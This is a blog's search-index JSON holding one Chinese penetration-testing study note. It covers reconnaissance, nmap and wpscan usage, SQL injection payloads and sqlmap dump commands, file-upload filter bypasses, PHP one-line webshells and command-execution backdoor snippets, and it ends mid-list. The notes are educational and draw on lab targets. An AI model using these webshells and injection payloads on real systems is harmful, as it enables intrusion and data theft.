{"meta":{"title":"听风的博客","subtitle":"","description":"","author":"听风","url":"http://example.com","root":"/"},"pages":[{"title":"about","date":"2025-01-25T09:32:33.000Z","updated":"2025-01-25T09:34:16.956Z","comments":true,"path":"about/index.html","permalink":"http://example.com/about/index.html","excerpt":"","text":""},{"title":"categories","date":"2025-01-25T09:30:32.000Z","updated":"2025-01-25T09:34:39.972Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"link","date":"2025-01-25T09:31:31.000Z","updated":"2025-01-25T09:34:31.711Z","comments":true,"path":"link/index.html","permalink":"http://example.com/link/index.html","excerpt":"","text":""},{"title":"tags","date":"2025-01-25T09:27:43.000Z","updated":"2025-01-25T09:35:44.869Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"渗透测试","slug":"渗透测试","date":"2025-04-30T12:41:44.000Z","updated":"2025-06-09T17:16:37.741Z","comments":true,"path":"2025/04/30/渗透测试/","permalink":"http://example.com/2025/04/30/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/","excerpt":"","text":"前置 虚拟机联网 123456789网络适配器-&gt;WLAN点下拉geng&#x27;d-&gt;共享clash verge: 打开系统代理和Tun 端口号7897ip: VMnet8的IPv4地址git 全局代理： 添加：git config --global http.proxy http://IP:7897 git config --global https.proxy http://IP:7897 取消：git config --global --unset http.proxy git config --global --unset https.proxy 查看：git config --global -l Linux 文件描述符 文件描述符 缩写 描述 默认设备 0 STDIN 标准输入 默认设备键盘 1 STDOUT 标准输出 默认设备显示器 2 STDERR 标准错误输出 默认设备显示器 重定向 12345678910111213//输入重定向&lt;从文件读取输入:sort &lt; 1.txt//输出重定向&gt;将输出保存到文件:echo 1 &gt; 2.txt&gt;&gt;将输出追加到文件:echo 2 &gt;&gt; 2.txt//管道|将一个程序的输出作为输入发送到另一个程序:cat 1 | grep a 文件描述符操作 12345678910111213141516171819202122232425262728293031323334353637383940414243444546//更改标准输出位置//把标准输出位置更改到test文件中：exec 1&gt;test//把当前标准输出重定向到test文件中：→~→echo &#x27;1st&#x27; 1&gt;test→~→cat testlst//更改标准输入位置//从键盘输入，把输入读入user变量→~→read usertesttest→~→echo $usertesttest//把test文件中的内容重定向到标准输入：→~→read user 0&lt;test→~→echo $userlst//标准错误输出和标准输出的区别是，它在命令出错情况下的输出。exec 2&gt;test//创建文件描述符//创建exec 文件描述符 &lt;&gt; 文件名//调用&amp;文件描述符//关闭exec文件描述符&lt;&amp;-或exec文件描述符&gt;&amp;-//例子→~→exec 5&gt;test→~→echo &#x27;are you ok?&#x27; 1&gt;$5→~→cat testare you ok?//把文件描述符5指向test文件，然后把当前输出重定向到文件描述符5（用&amp;引用文件描述符，即找到文件描述符指向的目标文件)//特殊文件，写入的任何东西都会被清空。 /dev/null//把标准错误输出重定向到/dev/nul1,从而丢掉不想保存的错误信息whoami 2 &gt; /dev/null//快速移除文件中的数据而不用删除文件cat /dev/null &gt; test 信息收集 需收集的信息： 域名信息(whois.、备案信息、子域名) 服务器信息（端口、服务、真实IP) 网站信息（网站架构、操作系统、中间件、数据库、编程语言、指纹信息、W八F、敏感目录、敏感文件、源码泄露、旁站、C段) 管理员信息（姓名、职务、生日、联系电话、邮件地址） 域名信息 whois 域名查询whois 根据已知域名反查,获取:注册人邮箱;注册人姓名;注册人手机;注册更新时间等信息 脚本 12cd yjtoolspython whois_check.py 命令行 1whois [域名] 接口 https://whois.aliyun.com/ https://www.whois365.com/cn/ http://whois.chinaz.com/ whois反查域名 根据已知域名WHOIS中的信息来反查其它与此信息相同的域名列表,但可能是代理商 接口 https://whois.chinaz.com/ 查询到的邮箱名前几位隐蔽 https://whois.aizhan.com/reverse-whois/ 备案号 网页最下方通常有备案号,通过备案号查询该公司旗下其他域名或资产 接口 https://beian.miit.gov.cn/ https://icp.chinaz.com/ https://icp.chinaz.com/ 子域名 google hacking 语法 字符 注释 例子 注释 intext 寻找正文中含有关 键字的网页 intext：后台登录 将只返回正文中包含“后台登录”的网页 intitle 寻找标题中含有关 键字的网页 intitle：后台登录 将只返回标题中包含“后台 登录”的网页，intitle：后台登录密码将返回标题中 包含“后台登录而正文中包 含密码的网页 allinitle 用法和intitle类 似，只不过可以指 定多个词 alltitle：后台登录 管理员 将返回标题中包含“后台登录”和“管理员”的网页 inurl 将返回ur中含有关 键词的网页 inurl:Login 将返回ur1中含有Login 的网页 allinurl 用法和inurl类似， 只不过可以指定多 个词 n allinurl:Login admin 将返回ur1中含有Login 和admin的网页 site 指定访问的站点 site:baidu.com inurl:Login 将只在baidu.com中查找 urI中含有Login的网页 filetype 指定访问的文件类 型 site:baidu.com filetype:pdf 将只返回baidu.com站点 上文件类型为pdf的网页 link 指定链接的网页 link:www.baidu.com 将返回所有包含指向 www.baidu.com的网页 related 相似类型的网页 related:www.xjtu.edu.cn 将返回与 www.xjtu.edu.cn相似的 页面，相似指的是网页的布局相似 info 返回站点的指定信 意 info:www.baidu.com corn 将返回百度的一些信息 define 返回某个词语的定 发 define:Hacker 将返回关于 Hacker的定义 cache 网页快照，谷歌将 返回给你它存储下 莱的房使货 cache:www.hackingspirits.com guest 将返回指定网站的缓存，并 且正文中含有guest 示例 语法 注释 inurl://admin/login.php 查找管理员登录页面 inurl:/phpmyadmin/index.php 查找后台数据库管理页面 site:baidu.com inurl:Login 只在baidu.com中查找url 中含有Login的网页 site:baidu.com filetype:pdf ed 只返回baidu.com站点上 文件类型为pdf的网页 link:www.baidu.com 返回所有包含指向 www.baidu.com的网页 related:www.1lhc.edu.cn 返回与 www.11hc.edu.cn网页 布局相似的页面 site:xx.comintext:管理site:xx.cominurl:login site:xx.comintitle:后台 查找网站后台 site:xx.com filetype:php site:xx.com filetype:asp site:xx.com filetype:jsp site:xx.com filetype:aspx 查看服务器使用的程序 site:xx.com inurl:file site:xx.com inurl:load 查看上传漏洞 Index of目录发现 1234567891011index of /adminindex of /passwdindex of /passwordindex of /mail&quot;index of /&quot; +passwd&quot;index of /&quot; +password.txt&quot;index of /&quot; +.htaccess&quot;index of /root&quot;&quot;index of /cgi-bin&quot;&quot;index of /logs&quot;&quot;index of /config&quot; 子域名查询 1site:[域名] 接口查询 https://dnsdumpster.com/ https://www.dnsgrep.cn/ https://developers.virustotal.com/reference/domains-relationships http://tool.chinaz.com/subdomain https://www.nmmapper.com/sys/tools/subdomainfinder/ 网络空间测绘工具 工具名称 网址 语法 FOFA https://fofa.info/ domain=“[域名]” 鹰图 https://hunter.qianxin.com/ domain=“[域名]” 钟馗之眼 https://www.zoomeye.org/ site:“[域名]” shodan https://www.shodan.io/ hostname:[域名] SSL证书查询 https://crt.sh/ https://developers.facebook.com/tools/ct/search/ JS文件发现 脚本 12cd JSFinderpython JSFinder.py -u http://[域名] 聚合工具 OneForAll 12345conda active py39\\cd OneForAll/python oneforall.py --target [域名] run(谷歌联网)(查看 ./results/[域名].csv) 爆破 子域名挖掘机(主机D://渗透) 服务器信息 IP收集 IP反查域名 http://stool.chinaz.com/same https://tools.ipip.net/ipdomain.php https://www.dnsgrep.cn/ https://site.ip138.com/ 域名查IP http://ip.tool.chinaz.com/ https://ipchaxun.com/ https://site.ip138.com/ C段存活主机探测 先旁注 后C段 查找与目标服务器P处于同一个C段的服务器IP 域名显示运营商是阿里云不是xxx机房之类，不用查 nmap 只能查出有没有开机 12nmap -sP www.example.com/24nmap -sP 192.168.1.* 脚本 1./TxPortMap -i www.example.com/24 -p 80 CDN 多地ping 123http://ping.chinaz.com/https://ping.aizhan.com/http://www.webkaka.com/Ping.aspx 用各种多地ping的服务，查看对应P地址是否唯一 国外访问 https://ping.sx/ping 有些网站设置CDN可能没有把国外的访问包含进去，所以可以这么绕过 查询子域名IP MX记录邮件服务 ​ MX记录是一种常见的查找IP的方式。如果网站在与wb相同的服务器和IP上托管自己的邮件服务器，那么原始服务器P将在MX记录中。 查询历史DNS记录 https://viewdns.info/iphistory/ https://www.ip138.com/ 真实ip可能是买DNS的前一个 端口收集 一个电脑最多65525个端口,常见端口总结 https://edu.yijinglab.com/post/280 nmap 123456789101112131415161718192021222324252627282930nmap -A -T4 192.168.1.1A：全面扫描\\综合扫描T4：扫描速度，共有6级，T0-T5不加端口则扫描默认端口，1-1024 + nmap-service单一主机扫描：nmap 192.168.1.2子网扫描：nmap 192.168.1.1/24多主机扫描：nmap 192.168.1.1 192.168.1.10主机范围扫描：nmap 192.168.1.1-100IP地址列表扫描：nmap –iL target.txt扫描除指定IP外的所有子网主机：nmap 192.168.1.1/24 --exclude 192.168.1.1扫描除文件中IP外的子网主机：nmap 192.168.1.1/24 --excludefile xxx.txt扫描特定主机上的80,21,23端口：nmap –p 80,21,23 192.168.1.1 12345678910nmap -sS -v -T4 -Pn -p 0-65535 -oN FullTCP -iL liveHosts.txt-sS：SYN扫描,又称为半开放扫描，它不打开一个完全的TCP连接，执行得很快，效率高（一个完整的tcp连接需要3次握手，而-sS选项不需要3次握手）优点：Nmap发送SYN包到远程主机，但是它不会产生任何会话，目标主机几乎不会把连接记入系统日志。（防止对方判断为扫描攻击），扫描速度快，效率高，在工作中使用频率最高缺点：它需要root/administrator权限执行-Pn：扫描之前不需要用ping命令，有些防火墙禁止ping命令。可以使用此选项进行扫描-iL：导入需要扫描的列表 网站信息 操作系统 ping判断：windows的TTL值一般为128，Linux则为64。 TTL大于100的一般为windows,几十的一般为linux。 nmap -o [ip/域名] windows大小写不敏感，1inux则区分大小写 网站服务、容器类型 F12查看响应头Server字段 whatweb 1whateweb -v -a 3 [ip] wappalyzer插件 apache,nginx,tomcat,IIS 通过容器类型、版本可考虑对应容器存在的漏洞（解析漏洞） 脚本类型 1.php 2.jsp 3.asp/aspx 4.python 知道是什么语言才可以针对性的进行文件扫描、文件上传 数据库类型 https://edu.yijinglab.com/post/298 CMS识别 内容管理系统，用于网站内容文章管理。常见CMS:WordPress、Joomla、.Drupal、dedecms(织梦)、Discuz、phpcms等。 CMS检测识别工具 CMSeeK: 123cd CMSeekpython TPscan.py1 joomscan识别Joomla： 1joomscan -u http://192.168.233.187/ wpscan识别WordPress： 1234567891011121314151617181、刺探基础信息：wpscan --url http://www.example.com2、猜解后台用户名wpscan --url http://www.example.com --enumerate u3、使用字典暴破用户名admin的密码wpscan --url http://www.example.com -P password.txt -U admin 4、扫描插件wpscan --url http://www.example.com --enumerate p5、扫描易受攻击的插件wpscan --url http://www.example.com --enumerate vp6、扫描所有插件wpscan --url http://www.example.com --enumerate ap TPscan识别thinkphp： 12cd TPscanpython TPscan.py 敏感文件 .git泄漏 若存在.git泄漏，打开githack网站 https://githack.com/ 在网站上方的文本框中输入目标Git存储库的URL，例如https://example.com/.git/ 点击Generate link按钮生成可下载存储库的链接。 将生成的链接复制到浏览器地址栏中并打开。 从打开的页面中下载压缩的Git存储库文件。 .svn泄漏 1234cd SvnExploitpython SvnExploit.py -u http://192.168.27.128/.svn# 下载python SvnExploit.py -u http://192.168.27.128/.svn --dump 目录扫描 dirsearch -u [url] dir [url] /usr/share/wordlists/dirb/common.txt 7kbscan(windows) waf wafw00f 1wafw00f [url] nmap 123nmap –p80,443 --script http-waf-detect ipnmap –p80,443 --script http-waf-fingerprint ip 自动化集成工具 灯塔 123456cd LinuxEnvConfigsudo bash LinuxEnvConfig.sh8docker0的inet EHole 123456789cd D:\\渗透\\EHole\\EHole_windows_amd64EHole_windows_amd64.exe -h# URL地址需带上协议,每行一个EHole_windows_amd64.exe finger -l url.txt# 支持单IP或IP段EHole_windows_amd64.exe finger -f 192.168.1.1/24# 结果输出至export.json文件EHole_windows_amd64.exe finger -l url.txt -json export.json 漏洞挖掘 SQL注入 基础语法 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# 查找SELECT 列名 FROM 表名SELECT * FROM 表名# 删除DELETE FROM 表名称 WHERE 列名称 = 值DELETE * FROM 表名称# 更新UPDATE 表名称 SET 列名称 = 新值 WHERE 列名称 = 某值# 增加INSERT INTO 表名称 VALUES (值1, 值2,....)INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,....)# 字符截取# 截取结果中的值，从第一个字符开始，截取1个字符select mid(database(),1,1)# 截取结果中的值，从第一个字符开始，截取1个字符select substr(database(),1,1)# 左右字符# 返回当前数据库最左边的1个字符串select left(database(),1);# 返回当前数据库最右边的1个字符串select right(database(),1);# 字符ASCII# 结果为1或者0，也就是true or falseselect ascii(substr(database(),1,1))&gt;97;select ord(substr(database(),1,1))&gt;97;# 行数# 返回查询结果行数select count(username) from users;#合并select group_concat(a) from (select database() as a union select version() as a) as t;# 基础信息# 在sql语言中，and优先级大于or--+ 注释符limit 0,1 从你表中的第一个数据开始，只读取一个order by 排序，判断字段数量，也就是表的列数union select 联合查询，连接前面语句，起着合并查询的作用group_concat 合并多行数据到一行version() 当前数据库版本database() 当前数据库@@datadir 数据库数据路径@@version_compile_os 操作系统版本 系统表 在MySQL中，把information_schema看作是一个数据库，确切说是信息数据库。保存数据库名，数据库的表，表栏的数据类型与访问权限等。 SCHEMATA 表：提供了当前mysql实例中所有数据库的信息。 show databases; 的结果取之此表。 Schema.name列：所有数据库名 TABLES 表：提供了关于数据库中的表的信息。详细表述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。 show tables from schemaname; (schemaname为指定数据库名)的结果取之此表。 Table.name列：所有表名 Table.schema列：来自哪个数据库 COLUMNS 表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。 show columns from schemaname.tablename; (schemaname为指定数据库名, tablename为指定数据库下的数据表名)的结果取之此表。 Column_name列：所有列名 Table.name列：来自哪个表 Table.schema列：来自哪个数据库 判断是否有漏洞 根据客户端返回的结果来判断提交的测试语句是否成功被数据库引擎执行，如果测试语句被执行了，说明存在注入漏洞。 类型 按参数类型分类： 数字型 字符型 搜索型 按数据库返回结果分类： 回显注入 报错注入 盲注 基于布尔的盲注 基于时间的盲注 按注入点位置分类： GET注入 POST注入 Cookie注入 Header注入 … … 数字型 1234567891011121.and逻辑测试：and 1=1 sql语句： select name from users where id=1 and 1=1and 1=2 sql语句： select name from users where id=1 and 1=2通过比较页面的变化判断输入是否被带入数据库执行。2.单引号测试：sql语句： select name from users where id=1&#x27;构造sql语法错误，来判断输入是否被执行。 字符型 12345678910id=1&#x27;、id=1&quot; 构造sql语法错误，来判断输入是否被执行。1 and 1=1SQL语句： select name from users where id=&#x27;1 and 1=1&#x27;1&#x27; and &#x27;1&#x27;=&#x27;1SQL语句： select name from users where id=&#x27;1&#x27; and &#x27;1&#x27;=&#x27;1&#x27;1&#x27; and 1=1 #SQL语句： select name from users where id=&#x27;1&#x27; and 1=1 #&#x27;1&#x27; and 1=2 #SQL语句： select name from users where id=&#x27;1&#x27; and 1=2 #&#x27; 搜索型 123456789SQL=&quot;select * from users where name like &#x27;%tom%&#x27;&quot;1 and 1=1SQL查询语句为：select * from users where id like &#x27;%1 and 1=1%&#x27;这个输入显然会报错误。1%&#x27;1 and &#x27;%1%&#x27;&#x27; = &#x27;%1SQL查询语句：select * from users where name like &#x27;%1%&#x27; and &#x27;%1%&#x27; = &#x27;%1%&#x27;这里我们用 &#x27;% 来闭合 %&#x27; ，如果存在漏洞，返回正常信息。 GET显错注入 流程 01、获取字段数 order by x 02、获取显示位 union select 1,2,3,4…… 03、获取数据库信息 version()，user()，@@datadir 04、获取当前数据库 database()， schema() 05、获取所有数据库 06、获取数据库表 07、获取所有字段 08、获取数据 确定数字、字符、搜索型 注入点 当前数据库长度 遍历得当前数据库名称 获取数据库表总数 依次获取表的长度、名字 获取列 获取数据 注入步骤 123456789101112131415161718192021222324252627# 判断：id=1&#x27; and 1=1 --+id=-1&#x27; or 1=1 --+# order by语句判断字段数量：id=1&#x27; order by 3 --+# 联合查询获取显示位：id=-1&#x27; union select 1,2,3 --+# 获取当前数据库：id=-1&#x27; union select 1,(select database()),3 --+# 获取所有数据库：id=-1&#x27; union select 1,group_concat(schema_name),3 from information_schema.schemata --+# 获取当前数据库表名：id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27; --+# 获取users表所有字段：id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; --+# 获取security.users表所有字段id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;--+# 获取security.users表所有字段内容：id=-1&#x27; union select 1,username,password from users --+ 报错注入 12345678910111213141516171819202122232425262728291.floor()select * from test where id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a);2.extractvalue()select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));3.updatexml()select * from test where id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));4.geometrycollection()select * from test where id=1 and geometrycollection((select * from(select * from(select user())a)b));5.multipoint()select * from test where id=1 and multipoint((select * from(select * from(select user())a)b));6.polygon()select * from test where id=1 and polygon((select * from(select * from(select user())a)b));7.multipolygon()select * from test where id=1 and multipolygon((select * from(select * from(select user())a)b));8.linestring()select * from test where id=1 and linestring((select * from(select * from(select user())a)b));9.multilinestring()select * from test where id=1 and multilinestring((select * from(select * from(select user())a)b));10.exp()select * from test where id=1 and exp(~(select * from(select user())a)); 绕过 123456注释符可替换空格 /**/ # --内联注入/*!/*!*//* */ 在mysql中是多行注释 但是如果里面加了! 那么后面的内容会被执行 工具使用 sqlmap 12345678910111213141516171819202122232425262728293031# 进入sqlmap目录# 检测漏洞python sqlmap.py [url]python sqlmap.py -u http://mingy.lab/Less-1/?id=1# 获取当前用户python sqlmap.py -u [url] --current-user# 当前数据库python sqlmap.py -u [url] --current-db# 所有数据库名python sqlmap.py -u [url] --dbs# 数据库表名python sqlmap.py -u [url] -D [库名] --tables# 列名python sqlmap.py -u [url] -D [库名] -T [表名] --columns# 字段值python sqlmap.py -u [url] -D [库名] -T [表名] -C [列名1],[列名2] --dump# post注入python sqlmap.py -r aa.txtpython sqlmap.py -r aa.txt --current-db --tables# aa.txt内容示例如下：POST /login.php HTTP/1.1Host: example.comContent-Type: application/x-www-form-urlencodedCookie: session=123456username=admin&amp;password=123456#请求方法（如 POST）|目标路径（如 /login.php）|Host 头和其他必要头部（如 Content-Type）|空一行后接 POST 数据（如 username=...&amp;password=...） 文件上传 常见一句话木马 123456php一句话木马： &lt;?php @eval($_POST[value]);?&gt;asp一句话木马： &lt;%eval request(&quot;value&quot;)%&gt;aspx一句话木马： &lt;%@ Page Language=&quot;Jscript&quot;%&gt;&lt;%eval(Request.Item[&quot;value&quot;])%&gt; 绕过 绕过客户端检测/JS检测 原理：通常在上传页面里含有专门检测文件上传的JavaScript代码，最常见的就是检测文件类型和扩展名是否合法。 方法：在本地浏览器客户端禁用]S即可；可使用火狐浏览器的Noscript插件、IE中禁用JS等方式实现，利用burpsuite可以绕过一切客户端检测。 绕过服务端检测 绕过MIME MIME类型 MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的标准，用来表示文档、文件或字节流的性质和格式。 常见MIME类型 超文本标记语言文本 .html text/html 普通文本 .txt text/plain PDF文档 .pdf application/pdf Microsoft Word文件 .word application/msword PNG图像 .png image/png GIF图形 .gif image/gif JPEG图形 .jpeg,.jpg image/jpeg au声音文件 .au audio/basic MPEG文件 .mpg,.mpeg video/mpeg AVI文件 .avi video/x-msvideo GZIP文件 .gz application/x-gzip 用burpsuite截取并修改数据包中文件的content-type类型进行绕过 绕过文件后缀 黑名单绕过 1.后缀大小写绕过：(.Php) 在对后缀的判断中，如果只是对字符串进行单独的比较来判断是不是限制文件，可以采用后缀名大小写绕过形式。 2.空格绕过：(php ) 如果黑名单没有对后缀名进行去空处理，可以通过在后缀名后加空进行绕过。 3.点绕过：(php.) 如果黑名单没有对后缀名进行去.处理，利用Windows.系统的文件名特性，会自动去掉后缀名最后的.，通过在文件名后加.进行绕过。 4.::DATA绕过如果黑名单没有对后缀名进行去：DATA绕过 如果黑名单没有对后缀名进行去：DATA绕过如果黑名单没有对后缀名进行去：DATA处理，利用Windows下NTFS文件系统的一个特性，可以在后缀名后加：：$DATA,绕过对黑名单的检测。 5.配合Apache解析漏洞 Apache解析有一个特点，解析文件时是从右往左判断，如果为不可识别解析再往左判断，如 aa.php.owf.rar文件，Apache不可识别解析’.owf’和’.rar’这两种后缀，会解析成.php文件。 6…htaccess文件 配合名单列表绕过，上传一个自定义的.htaccess,就可以轻松绕过各种检测 .htaccess文件（或者&quot;分布式配置文件&quot;），全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法，即，在一个特定的文档目录中放置一个包含一个或多个指令的文件，以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。比如新建一个.htaccess文件： 123&lt;FilesMatch &quot;as.png&quot;&gt;setHandler application/x-httpd-php&lt;/FilesMatch&gt; 通过一个.htaccess文件调用php的解析器去解析一个文件名中只要包含&quot;as,png&quot;这个字符串的任意文件，所以无论文件名是什么样子，只要包含&quot;as.png&quot;这个字符串，都可以被以php的方式来解析，一个自定义的.htaccess文件就可以以各种各样的方式去绕过很多上传验证机制。 ​ 白名单绕过 白名单策略：文件扩展名不在白名单中为不合法。 绕过方法：服务端判断文件类型是从后往前判断，而对文件解析是从前往后解析，可以利用00截断的方式进行绕过，包括%00截断0x00截断。 php小于5.3.29且php配置magic_.quotes_.gpc=off %00截断在bp包第一行 1POST /upload-labs/Pass-12/index.php?save_path=../upload/666.php$00 HTTP/1.1 不要截断filename 1Content-Disposition:form-data;name=&quot;upload file&quot;;filename=&quot;webshell.png&quot; 0x00截断在bp不显示，但依旧不要截断filename 绕过文件内容检测 101代码注入 解析漏洞 Apache解析漏洞 形式：test.php.qwe,asd,任意不属于Apachel解析黑名单且也不属于白名单的名称 原理：Apache解析文件的规则是从右到左开始判断解析如果后缀名为不可识别文件解析，就再往左判断。比如test.php.qwe.asd,“.qwe&quot;和”.asd&quot;这两种后缀是apache不可识别解析，apaches就会把test.php.qwe.asd解析成php。 条件：apache通过mod_php来运行脚本，其2.4.0-2.4.29中存在apache换行解析漏洞，在解析php时xxx.php\\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略 www.xxx.com/test.php.qwe.asd 以moudel方式连接，配置文件httpd.conf中LoadModule rewrite module,modules/mod_rewrite.so前的注释去掉，寻找关键词：AllowOverride,并把后面的参数从None全部改成AII Nginx解析漏洞 形式：任意文件名/任意文件名.php 一个在任意文件名后面添加/任意文件名.php的解析漏洞，比如原本文件名是test,jpg,可以添加为test.jpg/x.php进行解析攻击。 原理：Ngix&lt;0.8.37默认是以CGl的方式支持PHP解析的，普遍的做法是在Nginxi配置文件中通过正则匹配设置SCRIPT_FILENAME。当访问www.xx.com/phpinfo.jpg/1.php这个URL时， $fastcgi_script_name会被设置为phpinfo.jpg/1.php,然后构造成SCRIPT_FILENAME传递给PHP CGI,但是PHP为什么会接受这样的参数，并将phpinfo.jpg作为PHP文件解析呢？这就要说到fix_pathinfo这个选项了。如果开启了这个选项，那么就会触发在PHP中的如下逻辑：PHP会认为SCRIPT_FILENAME是phpinfo.jPg,而1.php是PATH_INFO,所以就会将phpinfo.jpg作为PHP文件来解析了 漏洞形式： 123www.xxxx.com/UploadFiles/image/1.jpg/1.phpwww.xxxx.com/UploadFiles/image/1.jpg.phpwww.xxxx.com/UploadFiles/image/1.jpg/\\0.php 形式：任意文件名%00.php 对低版本的Nginx可以在任意文件名后面添加%00.php进行解析攻击。(Nginx版本&lt;=0.8.37空字节代码执行漏洞) IIS 6.0解析漏洞 1.目录解析 形式：www.xxx.com/xx.asp/xx.jpg 原理：服务器默认会把.asp目录下的文件都解析成asp文件。 2.文件解析 形式：www.xxx.com/xx.asp;.jpg 原理：服务器默认不解析号后面的内容，因此xx.asp;.jpg便被解析成asp文件了。 IIS6.0默认的可执行文件除了asp还包含这三种： 123/test.asa/test.cer/test.cdx IIS 7.0/7.5解析漏洞 形式：任意文件名/任意文件名.php 原理：IlS7.0/7.5是对php解析时有一个类似于Nginx的解析漏洞，对任意文件名只要在URL后面追加上字符串/任意文件名.php就会按照php的方式去解析 由于php配置文件中，开启了cgi.fix_pathinfo,而这并不是nginxi或者IIS7.5本身的漏洞。 防御 1.文件上传的目录设置为不可执行 只要web容器无法解析该目录下面的文件，即使攻击者上传了脚本文件，服务器本身也不会受到影响，这一点至关重要。 2.判断文件类型 在判断文件类型时，可以结合使用MIME-Type、后缀检查等方式。在文件类型检查中，强烈推荐白名单方式，黑名单的方式已经无数次被证明是不可靠的。此外，对于图片的处理，可以使用压缩函数或者resize函数，在处理图片的同时破坏图片中可能包含的HTML代码。 3.使用随机数改写文件名和文件路径 文件上传如果要执行代码，则需要用户能够访问到这个文件。在某些环境中，用户能上传，但不能访问。如果应用了随机数改写了文件名和路径，将极大地增加攻击的成本。再来就是像 shell.php.rar.rar和crossdomain.xml这种文件，都将因为重命名而无法攻击。 4.单独设置文件服务器的域名 由于浏览器同源策略的关系，一系列客户端攻击将失效，比如上传crossdomain.xml、上传包含Javascript的XSS利用等问题将得到解决。 命令执行漏洞 PHP执行函数 eval 语法： 1eval ( string $code ) 用法： 1234&lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&gt;# 函数传入的参数必须为PHP代码，即要以分号结尾；如果想要执行系统命令，必须加上命令执行函数，如system(&quot;命令&quot;)；url/x.php后postcmd=system(whoami) assert 语法 123assert ( mixed $assertion [, string $description ] )# 代码执行只适用于php5版本，php7.0则可以用配置文件去除assert的代码执行功能，php7.1 assert将不能执行代码，php7.2 assert将不能传入字符串参数# 如果assertion是字符串，它将会被assert()当做PHP代码来执行。 用法 12&lt;?php @assert($_POST[&#x27;cmd&#x27;])?&gt;# assert()函数是直接将传入的参数当成PHP代码执行，不需要以分号结尾 call_user_func 语法 12call_user_func ( callable $callback [, mixed $parameter [, mixed $... ]] )# 第一个参数callback是被调用的回调函数，其余参数是回调函数的参数。把第一个参数作为回调函数调用 用法 12345&lt;?phpcall_user_func(&quot;assert&quot;,$_POST[&#x27;cmd&#x27;]);//传入的参数作为assert函数的参数//cmd=system(whoami)?&gt; call_user_func_arry 语法 123call_user_func_array ( callable $callback , array $param_arr )# 把第一个参数作为回调函数(callback)调用，把参数数组作(param_arr)为回调函数的的参数传入。# 调用回调函数，并把一个数组参数作为回调函数的参数 用法 1234567&lt;?php $cmd=$_POST[&#x27;cmd&#x27;];$array[0]=$cmd;call_user_func_array(&quot;assert&quot;,$array);//将传入的参数作为数组的第一个值传递给assert函数//cmd=system(whoami)?&gt; preg_replace 语法 12345678preg_replace(&quot;/abc/e&quot;, $_REQUEST[&#x27;cmd&#x27;], &quot;abc&quot;);preg_replace:正则表达式替换函数，当第一个参数使用/e作为修饰符，会把第二个参数传入的字符串当作php代码执行。 第一个参数&quot;/abc/e&quot; 第二个参数php代码，可以用$_REQUEST[&#x27;cmd&#x27;],$_GET[&#x27;cmd&#x27;],$_POST[&#x27;cmd&#x27;] 第三个参数能够满足第一个参数匹配的字符串，如果不会写，就尽量和第一个参数/里的字符串保持一致 php&gt;5.5不再支持 array_map 用法 12345678$function_name = $_POST[&#x27;func&#x27;]; // 从post参数func获取函数名$function_args = $_POST[&#x27;args&#x27;]; // 从post参数args获取参数值$arr[0] = $function_args; // 把参数值换成数组array_map($function_name, $arr); // array_map执行 func(args);postfunc=system&amp;args=whoami // system(&quot;whoami&quot;);func=phpinfo&amp;args=1 // phpinfo(1); PHP系统命令执行函数 1234567system()：执行外部程序，并且显示输出；exec()：执行一个外部程序shell_exec()：通过 shell 环境执行命令，并且将完整的输出以字符串的方式返回。passthru()：执行unix系统命令并且显示原始输出pcntl_exec()：在当前进程空间执行指定程序popen()：打开进程文件指针proc_open()：执行一个命令，并且打开用来输入/输出的文件指针。 exec 语法 1234exec ( string $command [, array &amp;$output [, int &amp;$return_var ]] )//执行一个外部程序，exec执行command参数所指定的命令。//exec执行系统外部命令时不会输出结果，而是返回结果的最后一行。如果想得到结果，可以使用第二个参数，让其输出到指定的数组。此数组一个记录代表输出的一行。即如果输出结果有20行，则这个数组就有20条记录，所以如果需要反复输出调用不同系统外部命令的结果，最好在输出每一条系统外部命令结果时清空这个数组uset($output),以防混乱。第三个参数用来取得命令执行的状态码，通常执行成功都是返回0。 用法 1234567891011&lt;?php// 输出运行中的 php/httpd 进程的创建者用户名// （在可以执行 &quot;whoami&quot; 命令的系统上）// echo exec(&#x27;whoami&#x27;);// exec(&#x27;ls -la&#x27;, $return);// var_dump($return);$cmd=$_POST[&#x27;cmd&#x27;];@exec($cmd, $return);var_dump($return)?&gt; system 1234567891011121314151617system ( string $command [, int &amp;$return_var ] )//函数执行command参数所指定的命令，并且输出执行结果。//system和exec的区别在于，system在执行系统外部命令时，直接将结果输出到浏览器，如果执行命令成功则返回true,否则返回false。第二个参数与exec第三个参数含义一样。&lt;?phpecho &#x27;&lt;pre&gt;&#x27;;// 输出 shell 命令 &quot;ls&quot; 的返回结果// 并且将输出的最后一样内容返回到 $last_line。// 将命令的返回值保存到 $retval。$last_line = system(&#x27;ls&#x27;, $retval);// 打印更多信息echo &#x27;&lt;/pre&gt;&lt;hr /&gt;Last line of the output: &#x27; . $last_line . &#x27;&lt;hr /&gt;Return value: &#x27; . $retval;?&gt; shell_exec 1234567shell_exec(&quot;whoami&quot;); shell_exec($_REQUEST[&#x27;cmd&#x27;]);//默认不会输出命令的执行结果echo shell_exec(&quot;whoami&quot;); var_dump(shell_exec(&quot;whoami&quot;)); passthru 123passthru(&quot;whoami&quot;); passthru($_REQUEST[&#x27;cmd&#x27;]);//默认会输出命令的执行结果 popen 